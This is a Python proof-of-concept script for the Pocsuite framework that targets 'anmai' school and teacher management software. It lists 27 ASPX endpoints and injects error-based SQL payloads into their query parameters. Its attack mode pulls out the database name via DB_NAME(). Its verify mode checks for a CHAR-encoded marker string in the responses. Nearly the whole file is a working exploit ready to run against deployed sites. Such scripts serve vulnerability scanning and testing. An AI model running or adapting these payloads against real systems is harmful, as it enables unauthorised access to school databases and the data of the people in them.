#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = 'anmai teacher sql injection'
    vulID = '0'
    author = ['LRestless']
    vulType = 'sql-inj'
    version = '1'
    references = ['https://shuimugan.com/bug/view?bug_no=108502', 'https://shuimugan.com/bug/view?bug_no=106717', 'https://shuimugan.com/bug/view?bug_no=0107248']
    desc = '''anmai  teacher 模块  time模块  注入打包'''
    vulDate = '2015-04-13'
    createDate = '2019-04-11'
    updateDate = '2019-04-11'

    appName = 'anmai'
    appVersion = ''
    appPowerLink = 'http://www.anmai.net/'
    samples = ['re']

    url_list = ['/teacher/teachingtechnology/patentinfoEdit.aspx?id=1',
                '/teacher/teachingtechnology/teachingcoursewareEdit.aspx?id=1',
                '/teacher/teachingtechnology/wonderfulcoursewareEdit.aspx?id=1',
                '/teacher/teachingtechnology/ColligationSelect/TeachingExperience_P.aspx?id=1',
                '/teacher/teachingtechnology/ColligationSelect/TeachingPlan_P.aspx?id=1',
                '/teacher/teachingtechnology/ColligationSelect/TeachingPractise_P.aspx?id=1',
                '/teacher/teachingtechnology/ColligationSelect/TeachingReflect_P.aspx?id=1',
                '/teacher/teachingtechnology/ColligationSelect/TeachingSum_up_P.aspx?id=1',
                '/teacher/teachingtechnology/ColligationSelect/wonderfulcourseware_P.aspx?id=1',
                '/teacher/teachingtechnology/Course_Record_P.aspx?id=1',
                '/teacher//teachingtechnology/Literature_P.aspx?id=1',
                '/teacher/teachingtechnology/Patentinfo_P.aspx?id=1',
                '/teacher/teachingtechnology/Specialtyinfo_P.aspx?id=1',
                '/teacher/teachingtechnology/TitlePractice_P.aspx?id=1',
                '/teacher/teachingtechnology/TitleResearch_P.aspx?id=1',
                '/teacher/teachingtechnology/AppraiseDepReSet.aspx?type=getteatype&depid=1&cardid=1',
                '/teacher/mystudy/exchangestudyxiangxi.aspx?id=1',
                '/teacher/mystudy/peixunxiangxi.aspx?id=1',
                '/teacher/mystudy/professionxiangxi.aspx?id=1',
                '/teacher/mystudy/specialxiangxi.aspx?id=1',
                '/time/shezhiSystem/HBCourse.aspx?Gradename=1',
                '/time/ChangeCourse/HandChagneCourse.aspx?clsname=1',
                '/time/InsertCourseTable/rightInsertCourseTable.aspx?clsname=1',
                '/time/ChangeCourse/ChangeCourseList.aspx?idcard=1',
                '/TWmanage/weisheng/healthteachxx.aspx?id=1',
                '/oa/stock/applyInfo.aspx?username=1',
                '/RecruitstuManage/hiddenValue.aspx?topicid=1']

    def _attack(self):
        """attack mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        for i in self.url_list:
            url = self.url.strip('/') + i
            payload = "'+and+1=%28SELECT%20%20char%28126%29%2bDB_NAME()%2bchar%28126%29%29--+"
            url_p = url + payload
            resp = s.get(url_p)
            dbname = re.search('~(.*?)~', resp.content)
            if dbname:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['Database'] = {}
                result['Database']['DBname'] = dbname.group(1)
                break
        return self.parse_output(result)

    def _verify(self):
        """verify  mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        result['VerifyInfo'] = {}
        j = 0
        for i in self.url_list:
            url = self.url.strip('/') + i
            payload = "'+and+1=%28SELECT%20%20CHAR%28115%29%2bCHAR%28104%29%2bCHAR%28117%29%2bCHAR%2890%29%2bCHAR%2873%29%2bCHAR%28103%29%2bCHAR%28117%29%2bCHAR%2897%29%2bCHAR%28110%29%2bCHAR%2888%29%2bCHAR%2873%29%2bCHAR%2878%29%2bCHAR%2871%29%29--+"
            url_p = url + payload
            resp = s.get(url_p)
            time.sleep(0.5)
            if 'shuZIguanXING' in resp.content:
                result['VerifyInfo']['URL'+str(j)] = url
                j += 1
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

